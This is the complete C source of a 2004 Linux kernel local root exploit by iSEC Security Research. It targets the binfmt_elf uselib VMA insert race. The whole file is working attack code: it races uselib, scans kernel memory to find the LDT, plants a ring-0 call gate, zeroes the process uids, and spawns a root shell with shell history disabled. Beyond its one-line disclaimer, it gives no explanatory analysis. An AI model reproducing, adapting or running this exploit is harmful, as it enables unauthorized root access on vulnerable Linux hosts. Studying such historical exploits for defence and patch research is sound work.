/*
 *	binfmt_elf uselib VMA insert race vulnerability
 *	v1.08
 *
 *	gcc -O2 -fomit-frame-pointer elflbl.c -o elflbl
 *
 *	Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
 *
 *	THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 *	AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 *	WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *             
 *	http://www.isec.pl/vulnerabilities/isec-0021-uselib.txt
 */


#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <syscall.h>
#include <limits.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>

#include <linux/elf.h>
#include <linux/linkage.h>

#include <asm/page.h>
#include <asm/ldt.h>
#include <asm/segment.h>

#define str(s) #s
#define xstr(s) str(s)

#define MREMAP_MAYMOVE  1


//	temp lib location
#define LIBNAME 	"/dev/shm/_elf_lib"

//	shell name
#define	SHELL		"/bin/bash"

//	time delta to detect race
#define RACEDELTA	5000

//	if you have more deadbabes in memory, change this
#define MAGIC		0xdeadbabe


//	do not touch
#define	SLAB_THRSH	128
#define	SLAB_PER_CHLD	(INT_MAX - 1)
#define LIB_SIZE	( PAGE_SIZE * 4 )
#define STACK_SIZE	( PAGE_SIZE * 4 )

#define LDT_PAGES	( (LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1)/PAGE_SIZE )

#define ENTRY_GATE	( LDT_ENTRIES-1 )
#define SEL_GATE	( (ENTRY_GATE<<3)|0x07 )

#define ENTRY_LCS	( ENTRY_GATE-2 )
#define SEL_LCS		( (ENTRY_LCS<<3)|0x04 )

#define ENTRY_LDS	( ENTRY_GATE-1 )
#define SEL_LDS		( (ENTRY_LDS<<3)|0x04 )

#define kB		* 1024
#define MB		* 1024 kB
#define GB		* 1024 MB

#define TMPLEN		256
#define PGD_SIZE	( PAGE_SIZE*1024 )


extern char **environ;

static char cstack[STACK_SIZE];
static char name[TMPLEN];
static char line[TMPLEN];


static volatile int
	val = 0,
	go = 0,
	finish = 0,
	scnt = 0,
	ccnt=0,
	delta = 0,
	delta_max = RACEDELTA,
	map_flags = PROT_WRITE|PROT_READ;


static int
	fstop=0,
	silent=0,
	pidx,
	pnum=0,
	smp_max=0,
	smp,
	wtime=2,
	cpid,
	uid,
	task_size,
	old_esp,
	lib_addr,
	map_count=0,
	map_base=0,
	map_addr,
	addr_min,
	addr_max,
	vma_start,
	vma_end,
	max_page;


static struct timeval tm1, tm2;

static char *myenv[] = {"TERM=vt100",
			"HISTFILE=/dev/null",
			NULL};

static char hellc0de[] = "\x49\x6e\x74\x65\x6c\x65\x63\x74\x75\x61\x6c\x20\x70\x72\x6f\x70"
                         "\x65\x72\x74\x79\x20\x6f\x66\x20\x49\x68\x61\x51\x75\x65\x52\x00";


static char *pagemap, *libname=LIBNAME, *shellname=SHELL;



#define __NR_sys_gettimeofday	__NR_gettimeofday
#define __NR_sys_sched_yield	__NR_sched_yield
#define __NR_sys_madvise	__NR_madvise
#define __NR_sys_uselib		__NR_uselib
#define __NR_sys_mmap2		__NR_mmap2
#define __NR_sys_munmap		__NR_munmap
#define __NR_sys_mprotect	__NR_mprotect
#define __NR_sys_mremap		__NR_mremap

inline _syscall6(int, sys_mmap2, int, a, int, b, int, c, int, d, int, e, int, f);

inline _syscall5(int, sys_mremap, int, a, int, b, int, c, int, d, int, e);

inline _syscall3(int, sys_madvise, void*, a, int, b, int, c);
inline _syscall3(int, sys_mprotect, int, a, int, b, int, c);
inline _syscall3( int, modify_ldt, int, func, void *, ptr, int, bytecount );

inline _syscall2(int, sys_gettimeofday, void*, a, void*, b);
inline _syscall2(int, sys_munmap, int, a, int, b);

inline _syscall1(int, sys_uselib, char*, l);

inline _syscall0(void, sys_sched_yield);



inline int tmdiff(struct timeval *t1, struct timeval *t2)
{
int r;

	r=t2->tv_sec - t1->tv_sec;
	r*=1000000;
	r+=t2->tv_usec - t1->tv_usec;
return r;
}


void fatal(const char *message, int critical)
{
int sig = critical? SIGSTOP : (fstop? SIGSTOP : SIGKILL);

	if(!errno) {
		fprintf(stdout, "\n[-] FAILED: %s ", message);
	} else {
		fprintf(stdout, "\n[-] FAILED: %s (%s) ", message,
			(char*) (strerror(errno)) );
	}
	if(critical)
		printf("\nCRITICAL, entering endless loop");
	printf("\n");
	fflush(stdout);

	unlink(libname);
	kill(cpid, SIGKILL);
	for(;;) kill(0, sig);
}


//	try to race do_brk sleeping on kmalloc, may need modification for SMP
int raceme(void* v)
{
	finish=1;

	for(;;) {
		errno = 0;

//	check if raced:
recheck:
		if(!go) sys_sched_yield();
		sys_gettimeofday(&tm2, NULL);
		delta = tmdiff(&tm1, &tm2);
		if(!smp_max && delta < (unsigned)delta_max) goto recheck;
		smp = smp_max;

//	check if lib VMAs exist as expected under race condition
recheck2:
		val = sys_madvise((void*) lib_addr, PAGE_SIZE, MADV_NORMAL);
		if(val) continue;
		errno = 0;
		val = sys_madvise((void*) (lib_addr+PAGE_SIZE),
				LIB_SIZE-PAGE_SIZE, MADV_NORMAL);
		if( !val || (val<0 && errno!=ENOMEM) ) continue;

//	SMP?
		smp--;
		if(smp>=0) goto recheck2;

//	recheck race
		if(!go) continue;
		finish++;

//	we need to free one vm_area_struct for mmap to work
		val = sys_mprotect(map_addr, PAGE_SIZE, map_flags);
		if(val) fatal("mprotect", 0);
		val = sys_mmap2(lib_addr + PAGE_SIZE, PAGE_SIZE*3, PROT_NONE,
			      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
		if(-1==val) fatal("mmap2 race", 0);
		printf("\n[+] race won maps=%d", map_count); fflush(stdout);
		_exit(0);
	}

return 0;
}


int callme_1()
{
	return val++;
}


inline int valid_ptr(unsigned ptr)
{
	return ptr>=task_size && ptr<addr_min-16;
}


inline int validate_vma(unsigned *p, unsigned s, unsigned e)
{
unsigned *t;

	if(valid_ptr(p[0]) && valid_ptr(p[3]) && p[1]==s && p[2]==e) {
		t=(unsigned*)p[3];
		if( t[0]==p[0] && t[1]<=task_size && t[2]<=task_size )
			return 1;
	}
	return 0;
}


asmlinkage void kernel_code(unsigned *task)
{
unsigned *addr = task;

//	find & reset uids
	while(addr[0] != uid || addr[1] != uid ||
	      addr[2] != uid || addr[3] != uid)
		addr++;

	addr[0] = addr[0] = addr[2] = addr[3] = 0;
	addr[4] = addr[5] = addr[6] = addr[7] = 0;

//	find & correct VMA
	for(addr=(unsigned *)task_size; (unsigned)addr<addr_min-16; addr++) {
		if( validate_vma(addr, vma_start, vma_end) ) {
			addr[1] = task_size - PAGE_SIZE;
			addr[2] = task_size;
			break;
		}
	}
}


void kcode(void);


void __kcode(void)
{
asm(
	"kcode:						\n"
	"	pusha					\n"
	"	pushl	%es				\n"
	"	pushl	%ds				\n"
	"	movl	$(" xstr(SEL_LDS) ") ,%edx	\n"
	"	movl	%edx,%es			\n"
	"	movl	%edx,%ds			\n"
	"	movl	$0xffffe000,%eax		\n"
	"	andl	%esp,%eax			\n"
	"	pushl	%eax				\n"
	"	call	kernel_code			\n"
	"	addl	$4, %esp			\n"
	"	popl	%ds				\n"
	"	popl	%es				\n"
	"	popa					\n"
	"	lret					\n"
    );
}


int callme_2()
{
	return val + task_size + addr_min;
}


void sigfailed(int v)
{
	ccnt++;
	fatal("lcall", 1);
}


//	modify LDT & exec
void try_to_exploit(unsigned addr)
{
volatile int r, *v;

	printf("\n[!] try to exploit 0x%.8x", addr); fflush(stdout);
	unlink(libname);

	r = sys_mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE|map_flags);
	if(r) fatal("mprotect 1", 1);

//	check if really LDT
	v = (void*) (addr + (ENTRY_GATE*LDT_ENTRY_SIZE % PAGE_SIZE) );
	signal(SIGSEGV, sigfailed);
	r = *v;
	if(r != MAGIC) {
		printf("\n[-] FAILED val = 0x%.8x", r); fflush(stdout);
		fatal("find LDT", 1);
	}

//	yeah, setup CPL0 gate
	v[0] = ((unsigned)(SEL_LCS)<<16) | ((unsigned)kcode & 0xffffU);
	v[1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;
	printf("\n[+] gate modified ( 0x%.8x 0x%.8x )", v[0], v[1]); fflush(stdout);

//	setup CPL0 segment descriptors (we need the 'accessed' versions ;-)
	v = (void*) (addr + (ENTRY_LCS*LDT_ENTRY_SIZE % PAGE_SIZE) );
	v[0] = 0x0000ffff; /* kernel 4GB code at 0x00000000 */
	v[1] = 0x00cf9b00;

	v = (void*) (addr + (ENTRY_LDS*LDT_ENTRY_SIZE % PAGE_SIZE) );
	v[0] = 0x0000ffff; /* kernel 4GB data at 0x00000000 */
	v[1] = 0x00cf9300;

//	reprotect to get only one big VMA
	r = sys_mprotect(addr, PAGE_SIZE, PROT_READ|map_flags);
	if(r) fatal("mprotect 2", 1);

//	CPL0 transition
	sys_sched_yield();
	val = callme_1() + callme_2();
	asm("lcall $" xstr(SEL_GATE) ",$0x0");
	if( getuid()==0 || (val==31337 && strlen(hellc0de)==16) ) {
		printf("\n[+] exploited, uid=0\n\n" ); fflush(stdout);
	} else {
		printf("\n[-] uid change failed" ); fflush(stdout);
		sigfailed(0);
	}
	signal(SIGTERM, SIG_IGN);
	kill(0, SIGTERM);
	execl(shellname, "sh", NULL);
	fatal("execl", 0);
}


void scan_mm_finish();
void scan_mm_start();


//	kernel page table scan code
void scan_mm()
{
	map_addr -= PAGE_SIZE;
	if(map_addr <= (unsigned)addr_min)
		scan_mm_start();

	scnt=0;
	val = *(int*)map_addr;
	scan_mm_finish();
}


void scan_mm_finish()
{
retry:
	__asm__("movl	%0, %%esp" : :"m"(old_esp) );

	if(scnt) {
		pagemap[pidx] ^= 1;
	}
	else {
		sys_madvise((void*)map_addr, PAGE_SIZE, MADV_DONTNEED);
	}
	pidx--;
	scan_mm();
	goto retry;
}


//	make kernel page maps before and after allocating LDT
void scan_mm_start()
{
static int npg=0;
static struct modify_ldt_ldt_s l;

	pnum++;
	if(pnum==1) {
		pidx = max_page-1;
	}
	else if(pnum==2) {
		memset(&l, 0, sizeof(l));
		l.entry_number = LDT_ENTRIES-1;
		l.seg_32bit = 1;
		l.base_addr = MAGIC >> 16;
		l.limit = MAGIC & 0xffff;
		l.limit_in_pages = 1;
		if( modify_ldt(1, &l, sizeof(l)) != 0 )
			fatal("modify_ldt", 1);
		pidx = max_page-1;
	}
	else if(pnum==3) {
		npg=0;
		for(pidx=0; pidx<=max_page-1; pidx++) {
			if(pagemap[pidx]) {
				npg++;
				fflush(stdout);
			}
			else if(npg == LDT_PAGES) {
				npg=0;
				try_to_exploit(addr_min+(pidx-1)*PAGE_SIZE);
			} else {
				npg=0;
			}
		}
		fatal("find LDT", 1);
	}

//	save context & scan page table
	__asm__("movl	%%esp, %0" : :"m"(old_esp) );
	map_addr = addr_max;
	scan_mm();
}


//	return number of available SLAB objects in cache
int get_slab_objs(const char *sn)
{
static int c, d, u = 0, a = 0;
FILE *fp=NULL;

	fp = fopen("/proc/slabinfo", "r");
	if(!fp)
		fatal("get_slab_objs: fopen", 0);
	fgets(name, sizeof(name) - 1, fp);
	do {
		c = u = a = -1;
		if (!fgets(line, sizeof(line) - 1, fp))
			break;
		c = sscanf(line, "%s %u %u %u %u %u %u", name, &u, &a,
			   &d, &d, &d, &d);
	} while (strcmp(name, sn));
	close(fileno(fp));
	fclose(fp);
	return c == 7 ? a - u : -1;
}


//	leave one object in the SLAB
inline void prepare_slab()
{
int *r;

	map_addr -= PAGE_SIZE;
	map_count++;
	map_flags ^= PROT_READ;

	r = (void*)sys_mmap2((unsigned)map_addr, PAGE_SIZE, map_flags,
			     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if(MAP_FAILED == r) {
		fatal("try again", 0);
	}
	*r = map_addr;
}


//	sig handlers
void segvcnt(int v)
{
	scnt++;
	scan_mm_finish();
}


//	child reap
void reaper(int v)
{
	ccnt++;
	waitpid(0, &v, WNOHANG|WUNTRACED);
}


//	sometimes I get the VMAs in reversed order...
//	so just use anyone of the two but take care about the flags
void check_vma_flags();

void vreversed(int v)
{
	map_flags = 0;
	check_vma_flags();
}


void check_vma_flags()
{
	if(map_flags) {
		__asm__("movl	%%esp, %0" : :"m"(old_esp) );
	} else {
		__asm__("movl	%0, %%esp" : :"m"(old_esp) );
		goto out;
	}
	signal(SIGSEGV, vreversed);
	val = * (unsigned*)(lib_addr + PAGE_SIZE);
out:
}


//	use elf library and try to sleep on kmalloc
void exploitme()
{
int r, sz, pcnt=0;
static char smiley[]="-\\|/-\\|/";

//	printf("\n    cat /proc/%d/maps", getpid() ); fflush(stdout);

//	helper clone
	finish=0; ccnt=0;
	sz = sizeof(cstack) / sizeof(cstack[0]);
	cpid = clone(&raceme, (void*) &cstack[sz-16],
			CLONE_VM|CLONE_SIGHAND|CLONE_FS|SIGCHLD, NULL );
	if(-1==cpid) fatal("clone", 0);

//	synchronize threads
	while(!finish) sys_sched_yield();
	finish=0;
	if(!silent) {
		printf("\n"); fflush(stdout);
	}

//	try to hit the kmalloc race
	for(;;) {

		r = get_slab_objs("vm_area_struct");
		while(r != 1) {
			prepare_slab();
			r--;
		}

		sys_gettimeofday(&tm1, NULL);
		go = 1;
		r=sys_uselib(libname);
		go = 0;
		if(r) fatal("uselib", 0);
		if(finish) break;

//	wipe lib VMAs and try again
		r = sys_munmap(lib_addr, LIB_SIZE);
		if(r) fatal("munmap lib", 0);
		if(ccnt) goto failed;

		if( !silent && !(pcnt%64) ) {
			printf("\r    Wait... %c", smiley[ (pcnt/64)%8 ]);
			fflush(stdout);
		}
		pcnt++;
	}

//	seems we raced, free mem
	r = sys_munmap(map_addr, map_base-map_addr + PAGE_SIZE);
	if(r) fatal("munmap 1", 0);
	r = sys_munmap(lib_addr, PAGE_SIZE);
	if(r) fatal("munmap 2", 0);
	
//	relax kswapd
	sys_gettimeofday(&tm1, NULL);
	for(;;) {
		sys_sched_yield();
		sys_gettimeofday(&tm2, NULL);
		delta = tmdiff(&tm1, &tm2);
		if( wtime*1000000U <= (unsigned)delta ) break;
	}

//	we need to check the PROT_EXEC flag
	map_flags = PROT_EXEC;
	check_vma_flags();
	if(!map_flags) {
		printf("\n    VMAs reversed"); fflush(stdout);
	}

//	write protect brk's VMA to fool vm_enough_memory()
	r = sys_mprotect((lib_addr + PAGE_SIZE), LIB_SIZE-PAGE_SIZE,
			 PROT_READ|map_flags);
	if(-1==r) { fatal("mprotect brk", 0); }

//	this will finally make the big VMA...
	sz = (0-lib_addr) - LIB_SIZE - PAGE_SIZE;
expand:
	r = sys_madvise((void*)(lib_addr + PAGE_SIZE),
			LIB_SIZE-PAGE_SIZE, MADV_NORMAL);
	if(r) fatal("madvise", 0);
	r = sys_mremap(lib_addr + LIB_SIZE-PAGE_SIZE,
			PAGE_SIZE, sz, MREMAP_MAYMOVE, 0);
	if(-1==r) {
		if(0==sz) {
			fatal("mremap: expand VMA", 0);
		} else {
			sz -= PAGE_SIZE;
			goto expand;
		}
	}
	vma_start = lib_addr + PAGE_SIZE;
	vma_end = vma_start + sz + 2*PAGE_SIZE;
	printf("\n    expanded VMA (0x%.8x-0x%.8x)", vma_start, vma_end);
	fflush(stdout);

//	try to figure kernel layout
	signal(SIGCHLD, reaper);
	signal(SIGSEGV, segvcnt);
	signal(SIGBUS, segvcnt);
	scan_mm_start();

failed:
	fatal("try again", 0);

}


//	make fake ELF library
void make_lib()
{
struct elfhdr eh;
struct elf_phdr eph;
static char tmpbuf[PAGE_SIZE];
int fd;

//	make our elf library
	umask(022);
	unlink(libname);
	fd=open(libname, O_RDWR|O_CREAT|O_TRUNC, 0755);
	if(fd<0) fatal("open lib ("LIBNAME" not writable?)", 0);
	memset(&eh, 0, sizeof(eh) );

//	elf exec header
	memcpy(eh.e_ident, ELFMAG, SELFMAG);
	eh.e_type = ET_EXEC;
	eh.e_machine = EM_386;
	eh.e_phentsize = sizeof(struct elf_phdr);
	eh.e_phnum = 1;
	eh.e_phoff = sizeof(eh);
	write(fd, &eh, sizeof(eh) );

//	section header:
	memset(&eph, 0, sizeof(eph) );
	eph.p_type = PT_LOAD;
	eph.p_offset = 4096;
	eph.p_filesz = 4096;
	eph.p_vaddr = lib_addr;
	eph.p_memsz = LIB_SIZE;
	eph.p_flags = PF_W|PF_R|PF_X;
	write(fd, &eph, sizeof(eph) );

//	execable code
	lseek(fd, 4096, SEEK_SET);
	memset(tmpbuf, 0x90, sizeof(tmpbuf) );
	write(fd, &tmpbuf, sizeof(tmpbuf) );
	close(fd);
}


//	move stack down #2
void prepare_finish()
{
int r;
static struct sysinfo si;

	old_esp &= ~(PAGE_SIZE-1);
	old_esp -= PAGE_SIZE;
	task_size = ((unsigned)old_esp + 1 GB ) / (1 GB) * 1 GB;
	r = sys_munmap(old_esp, task_size-old_esp);
	if(r) fatal("unmap stack", 0);

//	setup rt env
	uid = getuid();
	lib_addr = task_size - LIB_SIZE - PAGE_SIZE;
	if(map_base)
		map_addr = map_base;
	else
		map_base = map_addr = (lib_addr - PGD_SIZE) & ~(PGD_SIZE-1);
	printf("\n[+] moved stack %x, task_size=0x%.8x, map_base=0x%.8x",
		old_esp, task_size, map_base); fflush(stdout);

//	check physical mem & prepare
	sysinfo(&si);
	addr_min = task_size + si.totalram;
	addr_min = (addr_min + PGD_SIZE - 1) & ~(PGD_SIZE-1);
	addr_max = addr_min + si.totalram;
	if((unsigned)addr_max >= 0xffffe000 || (unsigned)addr_max < (unsigned)addr_min)
		addr_max = 0xffffd000;

	printf("\n[+] vmalloc area 0x%.8x - 0x%.8x", addr_min, addr_max);
	max_page = (addr_max - addr_min) / PAGE_SIZE;
	pagemap = malloc( max_page + 32 );
	if(!pagemap) fatal("malloc pagemap", 1);
	memset(pagemap, 0, max_page + 32);

//	go go
	make_lib();
	exploitme();
}


//	move stack down #1
void prepare()
{
unsigned p=0;

	environ = myenv;

	p = sys_mmap2( 0, STACK_SIZE, PROT_READ|PROT_WRITE,
		       MAP_PRIVATE|MAP_ANONYMOUS, 0, 0	);
	if(-1==p) fatal("mmap2 stack", 0);
	p += STACK_SIZE - 64;

	__asm__("movl	%%esp, %0	\n"
		"movl 	%1, %%esp	\n"
		: : "m"(old_esp), "m"(p)
	);

	prepare_finish();
}


void chldcnt(int v)
{
	ccnt++;
}


//	alloc slab objects...
inline void do_wipe()
{
int *r, c=0, left=0;

	__asm__("movl	%%esp, %0" : : "m"(old_esp) );

	old_esp = (old_esp - PGD_SIZE+1) & ~(PGD_SIZE-1);
	old_esp = map_base? map_base : old_esp;

	for(;;) {
		if(left<=0)
			left = get_slab_objs("vm_area_struct");
		if(left <= SLAB_THRSH)
			break;
		left--;

		map_flags ^= PROT_READ;
		old_esp -= PAGE_SIZE;
		r = (void*)sys_mmap2(old_esp, PAGE_SIZE, map_flags,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0 );
		if(MAP_FAILED == r)
			break;

		if(c>SLAB_PER_CHLD)
			break;
		if( (c%1024)==0 ) {
			if(!c) printf("\n");
			printf("\r    child %d VMAs %d", val, c);
			fflush(stdout);
		}
		c++;
	}
	printf("\r    child %d VMAs %d", val, c);
	fflush(stdout);
	kill(getppid(), SIGUSR1);
	for(;;) pause();
}


//	empty SLAB caches
void wipe_slab()
{
	signal(SIGUSR1, chldcnt);
	printf("\n[+] SLAB cleanup"); fflush(stdout);
	for(;;) {
		ccnt=0;
		val++;
		cpid = fork();
		if(!cpid)
			do_wipe();

		while(!ccnt) sys_sched_yield();
		if( get_slab_objs("vm_area_struct") <= SLAB_THRSH )
			break;
	}
	signal(SIGUSR1, SIG_DFL);
}


void usage(char *n)
{
	printf("\nUsage: %s\t-f forced stop\n", n);
	printf("\t\t-s silent mode\n");
	printf("\t\t-c command to run\n");
	printf("\t\t-n SMP iterations\n");
	printf("\t\t-d race delta us\n");
	printf("\t\t-w wait time seconds\n");
	printf("\t\t-l alternate lib name\n");
	printf("\t\t-a alternate addr hex\n");
	printf("\n");
	_exit(1);
}


//	give -s for forced stop, -b to clean SLAB
int main(int ac, char **av)
{
int r;

	while(ac) {
		r = getopt(ac, av, "n:l:a:w:c:d:fsh");
		if(r<0) break;

		switch(r) {

		case 'f' :
			fstop = 1;
			break;

		case 's' :
			silent = 1;
			break;

		case 'n' :
			smp_max = atoi(optarg);
			break;

		case 'd':
			if(1!=sscanf(optarg, "%u", &delta_max) || delta_max > 100000u )
				fatal("bad delta value", 0);
			break;

		case 'w' :
			wtime = atoi(optarg);
			if(wtime<0) fatal("bad wait value", 0);
			break;

		case 'l' :
			libname = strdup(optarg);
			break;

		case 'c' :
			shellname = strdup(optarg);
			break;

		case 'a' :
			if(1!=sscanf(optarg, "%x", &map_base))
				fatal("bad addr value", 0);
			map_base &= ~(PGD_SIZE-1);
			break;

		case 'h' :
		default:
			usage(av[0]);
			break;
		}
	}

//	basic setup
	uid = getuid();
	setpgrp();
	wipe_slab();
	prepare();

return 0;
}
